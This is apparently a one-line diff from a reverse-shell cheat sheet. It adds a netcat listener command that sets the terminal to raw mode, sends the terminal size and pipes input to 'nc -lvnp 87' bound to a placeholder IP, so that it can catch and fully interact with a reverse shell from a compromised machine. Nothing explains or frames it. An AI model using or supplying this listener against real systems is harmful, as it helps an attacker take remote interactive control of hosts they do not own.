@@ -1,0 +1,1 @@
+stty raw -echo; (stty size; cat) | nc -lvnp 87 -s **ip**
